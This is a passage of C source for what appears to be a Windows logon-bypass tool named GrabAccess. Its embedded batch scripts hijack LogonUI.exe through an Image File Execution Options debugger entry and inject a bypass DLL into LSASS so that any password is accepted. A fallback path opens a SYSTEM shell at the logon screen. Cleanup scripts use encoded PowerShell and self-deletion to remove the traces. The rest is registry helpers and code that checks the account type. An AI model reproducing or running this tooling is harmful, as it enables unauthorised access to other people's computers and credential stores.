    ":ga_desktop_ready\r\n"
    "ping 127.0.0.1 -n 4 > nul\r\n"
    "taskkill /f /im LockApp.exe > nul 2>&1\r\n"
    "taskkill /f /im LogonUI.exe > nul 2>&1\r\n"
    ":ga_cleanup\r\n"
    "schtasks /delete /tn \"\\GrabAccessCleanup\" /f > nul 2>&1\r\n"
    "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe\" /v Debugger /f > nul 2>&1\r\n"
    "del \"%GA_DIR%\\Injector.exe\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessMsvpBypass.dll\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessExplorerHost.exe\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessFallback.exe\" > nul 2>&1\r\n"
    "if exist \"%GA_DIR%\\GrabAccessMsvpBypass.dll\" powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwARwByAGEAYgBBAGMAYwBlAHMAcwBNAHMAdgBwAEIAeQBwAGEAcwBzAC4AZABsAGwAJwAKAGkAZgAoAFQAZQBzAHQALQBQAGEAdABoACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAkAHAAKQB7AAoAIAAgACQAcwA9ACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAE0AbwB2AGUARgBpAGwAZQBFAHgAKABzAHQAcgBpAG4AZwAgAGUAeABpAHMAdABpAG4AZwBGAGkAbABlAE4AYQBtAGUALABzAHQAcgBpAG4AZwAgAG4AZQB3AEYAaQBsAGUATgBhAG0AZQAsAGkAbgB0ACAAZgBsAGEAZwBzACkAOwAnAAoAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIABHAEEAIAAtAE4AYQBtAGUAIABOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzACAALQBNAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABzAAoAIAAgAFsAdgBvAGkAZABdAFsARwBBAC4ATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBNAG8AdgBlAEYAaQBsAGUARQB4ACgAJABwACwAJABuAHUAbABsACwANAApAAoAfQA= > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessReason.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessMethod.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GA_AccountSource.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GA_AuthSeen.flag\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\ga_status.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessRestore.bat\" > nul 2>&1\r\n"
    "start /b cmd /c \"ping 127.0.0.1 -n 2 > nul & del C:\\Windows\\System32\\GrabAccessCleanup.bat > nul 2>&1\"\r\n";

/* -- Fallback cleanup script --
 * Used when the sign-in path is not safe for automatic patching. It avoids
 * touching provider state because fallback mode never changes it. */
static char g_batFallbackCleanupHelper[] =
    "@echo off\r\n"
    "set GA_DIR=C:\\Windows\\System32\r\n"
    "schtasks /delete /tn \"\\GrabAccessCleanup\" /f > nul 2>&1\r\n"
    "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe\" /v Debugger /f > nul 2>&1\r\n"
    "del \"%GA_DIR%\\Injector.exe\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessMsvpBypass.dll\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessExplorerHost.exe\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessFallback.exe\" > nul 2>&1\r\n"
    "if exist \"%GA_DIR%\\GrabAccessMsvpBypass.dll\" powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwARwByAGEAYgBBAGMAYwBlAHMAcwBNAHMAdgBwAEIAeQBwAGEAcwBzAC4AZABsAGwAJwAKAGkAZgAoAFQAZQBzAHQALQBQAGEAdABoACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAkAHAAKQB7AAoAIAAgACQAcwA9ACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAE0AbwB2AGUARgBpAGwAZQBFAHgAKABzAHQAcgBpAG4AZwAgAGUAeABpAHMAdABpAG4AZwBGAGkAbABlAE4AYQBtAGUALABzAHQAcgBpAG4AZwAgAG4AZQB3AEYAaQBsAGUATgBhAG0AZQAsAGkAbgB0ACAAZgBsAGEAZwBzACkAOwAnAAoAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIABHAEEAIAAtAE4AYQBtAGUAIABOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzACAALQBNAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABzAAoAIAAgAFsAdgBvAGkAZABdAFsARwBBAC4ATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBNAG8AdgBlAEYAaQBsAGUARQB4ACgAJABwACwAJABuAHUAbABsACwANAApAAoAfQA= > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessReason.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessMethod.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GA_AccountSource.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GA_AuthSeen.flag\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\ga_status.txt\" > nul 2>&1\r\n"
    "del \"%GA_DIR%\\GrabAccessRestore.bat\" > nul 2>&1\r\n"
    "start /b cmd /c \"ping 127.0.0.1 -n 2 > nul & del C:\\Windows\\System32\\GrabAccessCleanup.bat > nul 2>&1\"\r\n";

/* -- Auto patch helper --
 * Supported path: local account + password / PIN / picture password. The BAT
 * injects Stage3 into LSASS, shows a controlled helper prompt, then chains to
 * the real LogonUI. It does not downgrade or rewrite credential-provider state. */
static char g_batAutoPatchHelper[] =
    "@echo off\r\n"
    "chcp 65001 > nul\r\n"
    "set GA_DIR=C:\\Windows\\System32\r\n"
    "if /I \"%~1\"==\"ga_fallback_console\" goto ga_fallback_console\r\n"
    "title GrabAccess\r\n"
    "del \"%GA_DIR%\\GA_AuthSeen.flag\" > nul 2>&1\r\n"
    "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe\" /f > nul 2>&1\r\n"
    "set \"GA_ACCOUNT_SOURCE=Unknown\"\r\n"
    "del \"%GA_DIR%\\GA_AccountSource.txt\" > nul 2>&1\r\n"
    "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ProgressPreference='SilentlyContinue'; $out='C:\\Windows\\System32\\GA_AccountSource.txt'; $src='Unknown'; $p='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI'; $r=Get-ItemProperty -Path $p -ErrorAction SilentlyContinue; $sid=$r.SelectedUserSID; if(-not $sid){$sid=$r.LastLoggedOnUserSID}; if(-not $sid){$sid=$r.LoggedOnUserSID}; if($sid){try{$src=(Get-LocalUser -SID $sid -ErrorAction Stop).PrincipalSource}catch{$src='Unknown'}}; Set-Content -Encoding ASCII -Path $out -Value $src\" > nul 2>&1\r\n"
    "if exist \"%GA_DIR%\\GA_AccountSource.txt\" set /p GA_ACCOUNT_SOURCE=<\"%GA_DIR%\\GA_AccountSource.txt\"\r\n"
    "del \"%GA_DIR%\\GA_AccountSource.txt\" > nul 2>&1\r\n"
    "if /I not \"%GA_ACCOUNT_SOURCE%\"==\"Local\" echo   Reason: Win32 PrincipalSource guard reported %GA_ACCOUNT_SOURCE%, not Local.>\"%GA_DIR%\\GrabAccessReason.txt\"\r\n"
    "if /I not \"%GA_ACCOUNT_SOURCE%\"==\"Local\" goto ga_account_fallback\r\n"
    "C:\\Windows\\System32\\Injector.exe -n lsass.exe -i C:\\Windows\\System32\\GrabAccessMsvpBypass.dll\r\n"
    "del C:\\Windows\\System32\\Injector.exe > nul 2>&1\r\n"
    "schtasks /delete /tn \"\\GrabAccessCleanup\" /f > nul 2>&1\r\n"
    "mode con: cols=96 lines=52 > nul 2>&1\r\n"
    "color 0A > nul 2>&1\r\n"
    "cls\r\n"
    "echo(                                       ::===*****=.\r\n"
    "echo(                                     =#**========*#=\r\n"
    "echo(                                    =#=====******==##\r\n"
    "echo(                                    :##********=##=:##.\r\n"
    "echo(                                     *#=********###*:*#.\r\n"
    "echo(                                     *#####*****#####=*#.\r\n"
    "echo(                                     .##=========*####**#                        .:===**\r\n"
    "echo(                                       *#*==*****==####=#:                      ****===:\r\n"
    "echo(        .:=====***=====:..              :##*========*###*               .:====**#=::::==\r\n"
    "echo(      =*****=======************====:.     =##******####=           .::=****====:#*=*****\r\n"
    "echo(    =#*==::::::::::::::::=====******#=      :==*=*#==#=  .::===******##=::===***##**====\r\n"
    "echo(   *#=::=========:::::::::::::::::::*#*=========:=##==#*****#####****#*=*******==#***###\r\n"
    "echo(  =#**##############*******=========:*##############=::*##******===:::*#*********###**==\r\n"
    "echo(   .:##=**=========****#################===========##::###=              ......   =####*\r\n"
    "echo(     ####****########*##==*#********==:            #****#*#***=:                    ::.\r\n"
    "echo(      :*###################:                      .#=:::#*==#****=.\r\n"
    "echo(         ::::::::::::==:=:                        .#=::=##**##***##*.\r\n"
    "echo(                                                  .#=::=#*==##=***###=\r\n"
    "echo(                                                  .#=::=##**###**==##=\r\n"
    "echo(                                        =**#=      #*::=####*==*##*##\r\n"
    "echo(                                        ##=*#=     #*::=#=.=*#***##*:\r\n"
    "echo(                                  :===*####=##     #*::=#*   .:::.\r\n"
    "echo(                                :##===##:.=**==:.  #*::=#*\r\n"
    "echo(                               *###**##= :########=#*:::#*\r\n"
    "echo(                               ..:#####::###########*:::#*\r\n"
    "echo(                                 =#####:=###########*:::#*\r\n"
    "echo(                                 *#####= =##########*:::###=\r\n"
    "echo(                                 =#######=*#########*:=*#####=\r\n"
    "echo(     ..::::::::::=====:           =###########################\r\n"
    "echo(   :*##***************#.            =*#######################.\r\n"
    "echo(  :#*###=============*#               .=*#####################\r\n"
    "echo(   :*#################*                   .::=#######==:#######\r\n"
    "echo(     :=******###***##.                        :######:::########.\r\n"
    "echo(             =#=***=*#.                        =#####:::########*\r\n"
    "echo(            :##*#**###.                         *####::*#########:\r\n"
    "echo(             =###*=##=                       :*######=###########*\r\n"
    "echo(              *##*#*#*                    :*#####################:\r\n"
    "echo(      =*******#******#********************######################************************\r\n"
    "echo(     =#=========****======================::::::::*#########*::::======:::::::::::::::::\r\n"
    "echo(     :#********************************************##########***************************\r\n"
    "echo(      .====================================*##################====::::::::::::::::::::==\r\n"
    "echo(\r\n"
    "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$s='GrabAccess '+[string]::Concat([char[]](0x6CE8,0x5165,0x6210,0x529F,0xFF0C,0x4F7F,0x7528,0x4EFB,0x610F,0x5BC6,0x7801,0x767B,0x5F55,0x3002)); Write-Host (' '+$s)\"\r\n"
    "echo  GrabAccess injection succeeded. Sign in with any password.\r\n"
    "echo.\r\n"
    "echo  Continuing in 6 seconds...\r\n"
    "timeout /t 6 /nobreak > nul\r\n"
    "goto ga_chain_logon\r\n"
    ":ga_account_fallback\r\n"
    GA_START_FALLBACK_CONSOLE
    "if not \"%~1\"==\"\" start \"\" %*\r\n"
    "exit /b 0\r\n"
    ":ga_fallback_console\r\n"
    GA_SHOW_FALLBACK_CONSOLE
    ":ga_chain_logon\r\n"
    "%*\r\n";

/* -- Fallback SYSTEM shell helper --
 * Unsupported or uncertain paths do not attempt the patch. The user gets a
 * SYSTEM shell plus a visible explanation, then can return to LogonUI. */
static char g_batFallbackShellHelper[] =
    "@echo off\r\n"
    "set GA_DIR=C:\\Windows\\System32\r\n"
    "if /I \"%~1\"==\"ga_fallback_console\" goto ga_fallback_console\r\n"
    "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe\" /f > nul 2>&1\r\n"
    GA_START_FALLBACK_CONSOLE
    "if not \"%~1\"==\"\" start \"\" %*\r\n"
    "exit /b 0\r\n"
    ":ga_fallback_console\r\n"
    GA_SHOW_FALLBACK_CONSOLE;


/* ============================================================================
 * Global State
 * ============================================================================ */
HANDLE g_hHeap = NULL;
int g_fallbackReason = FALLBACK_REASON_NONE;
int g_detectedAccountType = ACCOUNT_TYPE_UNKNOWN;
int g_detectedProviderType = PROVIDER_TYPE_UNKNOWN;
static char g_fallbackMethodText[128];

static char g_reasonProtectedLsass[] =
    "  Reason: protected LSASS / RunAsPPL is enabled, so unsigned LSASS injection is not reliable.\r\n";
static char g_reasonNonLocalAccount[] =
    "  Reason: the last sign-in account is not a supported local account.\r\n";
static char g_reasonUnsupportedProvider[] =
    "  Reason: the last sign-in provider is not password, PIN, or picture password.\r\n";
static char g_reasonUnknown[] =
    "  Reason: Stage2 could not reliably classify the last sign-in path.\r\n";

#if GA_DEBUG
void DebugLog(char* msg);
#else
#define DebugLog(msg) ((void)0)
#endif


/* ============================================================================
 * Utility: Display
 * ============================================================================ */
void print(PWCHAR pwmsg) {
    UNICODE_STRING msg;
    RtlInitUnicodeString(&msg, pwmsg);
    NtDisplayString(&msg);
}


/* ============================================================================
 * Utility: Heap Memory
 * ============================================================================ */
HANDLE InitHeapMemory(void) {
    g_hHeap = RtlCreateHeap(0x00000002, NULL, 0x100000, 0x1000, NULL, NULL); /* HEAP_GROWABLE */
    return g_hHeap;
}

BOOLEAN DeinitHeapMemory(void) {
    if (g_hHeap) {
        RtlDestroyHeap(g_hHeap);
        g_hHeap = NULL;
        return TRUE;
    }
    return FALSE;
}

void free(void* pMem) {
    if (g_hHeap && pMem) {
        RtlFreeHeap(g_hHeap, 0, pMem);
    }
}

void* malloc(unsigned long ulSize) {
    if (g_hHeap) {
        return RtlAllocateHeap(g_hHeap, 0, ulSize);
    }
    return NULL;
}


/* ============================================================================
 * Utility: File I/O
 * ============================================================================ */
BOOLEAN NtFileGetFileSize(HANDLE hFile, LONGLONG* pRetFileSize) {
    IO_STATUS_BLOCK sIoStatus;
    FILE_STANDARD_INFORMATION sFileInfo;
    NTSTATUS ntStatus;

    RtlZeroMemory(&sIoStatus, sizeof(IO_STATUS_BLOCK));
    RtlZeroMemory(&sFileInfo, sizeof(FILE_STANDARD_INFORMATION));

    ntStatus = NtQueryInformationFile(hFile, &sIoStatus, &sFileInfo,
                                      sizeof(FILE_STANDARD_INFORMATION),
                                      FileStandardInformation);
    if (NT_SUCCESS(ntStatus)) {
        if (pRetFileSize) {
            *pRetFileSize = sFileInfo.EndOfFile.QuadPart;
        }
        return TRUE;
    }
    return FALSE;
}

BOOLEAN NtFileReadFile(HANDLE hFile, PVOID pOutBuffer, ULONG dwOutBufferSize, ULONG* pRetReadedSize) {
    IO_STATUS_BLOCK sIoStatus;
    NTSTATUS ntStatus;

    RtlZeroMemory(&sIoStatus, sizeof(IO_STATUS_BLOCK));

    ntStatus = NtReadFile(hFile, NULL, NULL, NULL, &sIoStatus, pOutBuffer, dwOutBufferSize, NULL, NULL);
    if (NT_SUCCESS(ntStatus)) {
        if (pRetReadedSize) {
            *pRetReadedSize = (ULONG)sIoStatus.Information;
        }
        return TRUE;
    }
    return FALSE;
}

BOOLEAN NtFileWriteFile(HANDLE hFile, PVOID lpData, ULONG dwBufferSize, ULONG* pRetWrittenSize) {
    IO_STATUS_BLOCK sIoStatus;
    NTSTATUS ntStatus;

    RtlZeroMemory(&sIoStatus, sizeof(IO_STATUS_BLOCK));

    ntStatus = NtWriteFile(hFile, NULL, NULL, NULL, &sIoStatus, lpData, dwBufferSize, NULL, NULL);
    if (NT_SUCCESS(ntStatus)) {
        if (pRetWrittenSize) {
            *pRetWrittenSize = (ULONG)sIoStatus.Information;
        }
        return TRUE;
    }
    return FALSE;
}

BOOLEAN NtFileWriteFileByOffset(HANDLE hFile, PVOID lpData, ULONG dwBufferSize, ULONG* pRetWrittenSize, ULONG Offset) {
    IO_STATUS_BLOCK sIoStatus;
    NTSTATUS ntStatus;
    LARGE_INTEGER byteOffset;

    byteOffset.QuadPart = Offset;
    RtlZeroMemory(&sIoStatus, sizeof(IO_STATUS_BLOCK));

    ntStatus = NtWriteFile(hFile, NULL, NULL, NULL, &sIoStatus, lpData, dwBufferSize, &byteOffset, NULL);
    if (NT_SUCCESS(ntStatus)) {
        if (pRetWrittenSize) {
            *pRetWrittenSize = (ULONG)sIoStatus.Information;
        }
        return TRUE;
    }
    return FALSE;
}


/* ============================================================================
 * Utility: Registry
 * ============================================================================ */

/* Set a REG_SZ (or specified type) string value. Creates the key if needed. */
void setRegistryValue(WCHAR* keyName, WCHAR* valueName, WCHAR* value, ULONG valueType) {
    UNICODE_STRING KeyName, ValueName;
    HANDLE SoftwareKeyHandle;
    NTSTATUS Status;
    OBJECT_ATTRIBUTES ObjectAttributes;
    ULONG Disposition;

    RtlInitUnicodeString(&KeyName, keyName);
    InitializeObjectAttributes(&ObjectAttributes, &KeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&SoftwareKeyHandle, KEY_SET_VALUE, &ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE, &Disposition);
    if (!NT_SUCCESS(Status)) return;

    RtlInitUnicodeString(&ValueName, valueName);
    Status = ZwSetValueKey(SoftwareKeyHandle, &ValueName, 0, valueType, value, (wcslen(value) + 1) * sizeof(WCHAR));

    ZwClose(SoftwareKeyHandle);
}

/* Set a REG_DWORD value. Creates the key if needed. */
void setRegistryValueDword(WCHAR* keyName, WCHAR* valueName, ULONG valueData) {
    UNICODE_STRING KeyName, ValueName;
    HANDLE SoftwareKeyHandle;
    NTSTATUS Status;
    OBJECT_ATTRIBUTES ObjectAttributes;
    ULONG Disposition;

    RtlInitUnicodeString(&KeyName, keyName);
    InitializeObjectAttributes(&ObjectAttributes, &KeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&SoftwareKeyHandle, KEY_SET_VALUE, &ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE, &Disposition);
    if (!NT_SUCCESS(Status)) return;

    RtlInitUnicodeString(&ValueName, valueName);
    Status = ZwSetValueKey(SoftwareKeyHandle, &ValueName, 0, REG_DWORD, &valueData, sizeof(ULONG));

    ZwClose(SoftwareKeyHandle);
}

/* Read a registry value into a caller-supplied buffer. */
NTSTATUS readRegistryValue(IN PWCHAR keyName, IN PWCHAR valueName, OUT PVOID pValueData, IN ULONG valueDataSize, OUT PULONG pBytesRead) {
    NTSTATUS status;
    HANDLE hKey = NULL;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uKeyName, uValueName;
    PKEY_VALUE_PARTIAL_INFORMATION pValueInfo = NULL;
    ULONG resultLength = 0;
    ULONG valueInfoSize;

    if (!keyName || !valueName || !pValueData || !pBytesRead) {
        return STATUS_INVALID_PARAMETER;
    }

    *pBytesRead = 0;

    RtlInitUnicodeString(&uKeyName, keyName);
    InitializeObjectAttributes(&objAttr, &uKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = ZwOpenKey(&hKey, KEY_READ, &objAttr);
    if (!NT_SUCCESS(status)) {
        hKey = NULL;
        goto regcleanup;
    }

    valueInfoSize = sizeof(KEY_VALUE_PARTIAL_INFORMATION) + valueDataSize;
    pValueInfo = (PKEY_VALUE_PARTIAL_INFORMATION)malloc(valueInfoSize);
    if (!pValueInfo) {
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto regcleanup;
    }
    RtlZeroMemory(pValueInfo, valueInfoSize);

    RtlInitUnicodeString(&uValueName, valueName);
    status = ZwQueryValueKey(hKey, &uValueName, KeyValuePartialInformation, pValueInfo, valueInfoSize, &resultLength);
    if (!NT_SUCCESS(status)) {
        goto regcleanup;
    }

    if (pValueInfo->DataLength > valueDataSize) {
        status = STATUS_BUFFER_TOO_SMALL;
        goto regcleanup;
    }

    RtlCopyMemory(pValueData, pValueInfo->Data, pValueInfo->DataLength);
    *pBytesRead = pValueInfo->DataLength;

regcleanup:
    if (hKey) ZwClose(hKey);
    if (pValueInfo) free(pValueInfo);
    return status;
}

BOOLEAN ReadRegistrySzValue(WCHAR* keyName, WCHAR* valueName, WCHAR* outBuffer, ULONG outChars) {
    ULONG bytesRead = 0;
    NTSTATUS status;
    ULONG charsRead;

    if (!outBuffer || outChars == 0) {
        return FALSE;
    }

    RtlZeroMemory(outBuffer, outChars * sizeof(WCHAR));
    status = readRegistryValue(keyName, valueName, outBuffer,
                               (outChars - 1) * sizeof(WCHAR), &bytesRead);
    if (!NT_SUCCESS(status) || bytesRead == 0) {
        outBuffer[0] = L'\0';
        return FALSE;
    }

    charsRead = bytesRead / sizeof(WCHAR);
    if (charsRead >= outChars) {
        charsRead = outChars - 1;
    }
    outBuffer[charsRead] = L'\0';
    return TRUE;
}

BOOLEAN ReadRegistryDwordValue(WCHAR* keyName, WCHAR* valueName, ULONG* outValue) {
    ULONG value = 0;
    ULONG bytesRead = 0;
    NTSTATUS status;

    if (!outValue) {
        return FALSE;
    }

    status = readRegistryValue(keyName, valueName, &value, sizeof(ULONG), &bytesRead);
    if (!NT_SUCCESS(status) || bytesRead < sizeof(ULONG)) {
        return FALSE;
    }

    *outValue = value;
    return TRUE;
}

WCHAR UpcaseAsciiWide(WCHAR ch) {
    if (ch >= L'a' && ch <= L'z') {
        return (WCHAR)(ch - (L'a' - L'A'));
    }
    return ch;
}

BOOLEAN WideEqualInsensitive(WCHAR* left, WCHAR* right) {
    if (!left || !right) {
        return FALSE;
    }

    while (*left && *right) {
        if (UpcaseAsciiWide(*left) != UpcaseAsciiWide(*right)) {
            return FALSE;
        }
        left++;
        right++;
    }

    return (*left == L'\0' && *right == L'\0');
}

BOOLEAN WideStartsWithInsensitive(WCHAR* value, WCHAR* prefix) {
    if (!value || !prefix) {
        return FALSE;
    }

    while (*prefix) {
        if (*value == L'\0') {
            return FALSE;
        }
        if (UpcaseAsciiWide(*value) != UpcaseAsciiWide(*prefix)) {
            return FALSE;
        }
        value++;
        prefix++;
    }

    return TRUE;
}

BOOLEAN WideLooksLikeEmail(WCHAR* value) {
    WCHAR* user = value;
    WCHAR* at = NULL;
    WCHAR* dotAfterAt = NULL;

    if (!value) {
        return FALSE;
    }

    while (*user && *user != L'\\') {
        user++;
    }
    if (*user == L'\\') {
        user++;
    } else {
        user = value;
    }

    if (*user == L'\0' || *user == L'@') {
        return FALSE;
    }

    while (*user) {
        if (*user == L'@') {
            if (at != NULL) {
                return FALSE;
            }
            at = user;
        } else if (at != NULL && *user == L'.' && user > at + 1) {
            dotAfterAt = user;
        } else if (*user == L'\\') {
            return FALSE;
        }
        user++;
    }

    return (at != NULL && dotAfterAt != NULL && *(dotAfterAt + 1) != L'\0');
}

BOOLEAN HasMicrosoftAccountHint(WCHAR* value) {
    return (value
            && (WideEqualInsensitive(value, L"MicrosoftAccount")
                || WideStartsWithInsensitive(value, L"MicrosoftAccount\\")
                || WideStartsWithInsensitive(value, L"LiveId")
                || WideStartsWithInsensitive(value, L"msa:")
                || WideLooksLikeEmail(value)));
}

BOOLEAN HasAzureAdAccountHint(WCHAR* value) {
    return (value
            && (WideEqualInsensitive(value, L"AzureAD")
                || WideStartsWithInsensitive(value, L"AzureAD\\")
                || WideStartsWithInsensitive(value, L"OrgId")
                || WideStartsWithInsensitive(value, L"aad:")));
}

BOOLEAN WideStartsWithDomain(WCHAR* value, WCHAR* domain) {
    if (!value || !domain || domain[0] == L'\0') {
        return FALSE;
    }

    while (*domain) {
        if (*value == L'\0') {
            return FALSE;
        }
        if (UpcaseAsciiWide(*value) != UpcaseAsciiWide(*domain)) {
            return FALSE;
        }
        value++;
        domain++;
    }

    return (*value == L'\\');
}

BOOLEAN WideContainsBackslash(WCHAR* value) {
    if (!value) {
        return FALSE;
    }

    while (*value) {
        if (*value == L'\\') {
            return TRUE;
        }
        value++;
    }

    return FALSE;
}

BOOLEAN WideCopyString(WCHAR* dest, ULONG destChars, WCHAR* src) {
    ULONG i = 0;

    if (!dest || destChars == 0) {
        return FALSE;
    }

    dest[0] = L'\0';
    if (!src) {
        return FALSE;
    }

    while (src[i] && i + 1 < destChars) {
        dest[i] = src[i];
        i++;
    }
    dest[i] = L'\0';

    return (src[i] == L'\0');
}

BOOLEAN WideAppendString(WCHAR* dest, ULONG destChars, WCHAR* src) {
    ULONG i = 0;
    ULONG j = 0;

    if (!dest || !src || destChars == 0) {
        return FALSE;
    }

    while (i < destChars && dest[i]) {
        i++;
    }
    if (i >= destChars) {
        return FALSE;
    }

    while (src[j] && i + 1 < destChars) {
        dest[i] = src[j];
        i++;
        j++;
    }
    dest[i] = L'\0';

    return (src[j] == L'\0');
}

BOOLEAN SidMatchesCurrent(BOOLEAN haveCurrentSid, WCHAR* currentSid,
                          BOOLEAN haveCandidateSid, WCHAR* candidateSid) {
    if (!haveCurrentSid) {
        return TRUE;
    }

    return (haveCandidateSid
            && candidateSid
            && candidateSid[0] != L'\0'
            && WideEqualInsensitive(currentSid, candidateSid));
}

BOOLEAN IsLocalQualifiedUser(WCHAR* value, WCHAR* computer) {
    if (!value || value[0] == L'\0') {
        return FALSE;
    }

    if (WideStartsWithInsensitive(value, L".\\")) {
        return TRUE;
    }

    if (computer && computer[0] != L'\0' && WideStartsWithDomain(value, computer)) {
        return TRUE;
    }

    return FALSE;
}

BOOLEAN AccumulateAccountValue(WCHAR* value, WCHAR* computer,
                               BOOLEAN* sawMsa,
                               BOOLEAN* sawAzure,
                               BOOLEAN* sawLocal,
                               BOOLEAN* sawDomain) {
    if (!value || value[0] == L'\0') {
        return FALSE;
    }

    if (HasAzureAdAccountHint(value)) {
        *sawAzure = TRUE;
        return TRUE;
    }

    if (HasMicrosoftAccountHint(value)) {
        *sawMsa = TRUE;
        return TRUE;
    }

    if (IsLocalQualifiedUser(value, computer)) {
        *sawLocal = TRUE;
        return TRUE;
    }

    if (WideContainsBackslash(value)) {
        *sawDomain = TRUE;
        return TRUE;
    }

    return FALSE;
}

int ClassifyIdentityStoreValue(WCHAR* value) {
    if (!value || value[0] == L'\0') {
        return ACCOUNT_TYPE_UNKNOWN;
    }

    if (HasAzureAdAccountHint(value)) {
        return ACCOUNT_TYPE_AD;
    }

    if (HasMicrosoftAccountHint(value)) {
        return ACCOUNT_TYPE_MSA;
    }

    return ACCOUNT_TYPE_UNKNOWN;
}

BOOLEAN BuildIdentityStoreKey(WCHAR* outKey, ULONG outChars, WCHAR* sid, BOOLEAN includeIdentityCache) {
    if (!sid || sid[0] == L'\0') {
        return FALSE;
    }

    if (!WideCopyString(outKey, outChars, g_identityCachePrefix)) {
        return FALSE;
    }
    if (!WideAppendString(outKey, outChars, sid)) {
        return FALSE;
    }
    if (includeIdentityCache && !WideAppendString(outKey, outChars, g_identityCacheSubKey)) {
        return FALSE;
    }

    return TRUE;
}

int DetectIdentityStoreAccountTypeForKey(WCHAR* keyName) {
    WCHAR value[512];
    int type;

    if (ReadRegistrySzValue(keyName, g_identityNameProvider, value, 512)) {
        type = ClassifyIdentityStoreValue(value);
        if (type != ACCOUNT_TYPE_UNKNOWN) return type;
    }
    if (ReadRegistrySzValue(keyName, g_identityNameProviderId, value, 512)) {
        type = ClassifyIdentityStoreValue(value);
        if (type != ACCOUNT_TYPE_UNKNOWN) return type;
    }
    if (ReadRegistrySzValue(keyName, g_identityNameUpn, value, 512)) {
        type = ClassifyIdentityStoreValue(value);
        if (type != ACCOUNT_TYPE_UNKNOWN) return type;
    }
    if (ReadRegistrySzValue(keyName, g_identityNameEmail, value, 512)) {
        type = ClassifyIdentityStoreValue(value);
        if (type != ACCOUNT_TYPE_UNKNOWN) return type;
    }
    if (ReadRegistrySzValue(keyName, g_identityNameUserName, value, 512)) {
        type = ClassifyIdentityStoreValue(value);
        if (type != ACCOUNT_TYPE_UNKNOWN) return type;
    }
    if (ReadRegistrySzValue(keyName, g_identityNameAccountName, value, 512)) {
        type = ClassifyIdentityStoreValue(value);
        if (type != ACCOUNT_TYPE_UNKNOWN) return type;
    }
    if (ReadRegistrySzValue(keyName, g_identityNameDisplayName, value, 512)) {
        type = ClassifyIdentityStoreValue(value);
        if (type != ACCOUNT_TYPE_UNKNOWN) return type;
    }

    return ACCOUNT_TYPE_UNKNOWN;
}

int DetectIdentityStoreAccountType(WCHAR* sid) {
    WCHAR keyName[768];
    int type;

    if (!sid || sid[0] == L'\0') {
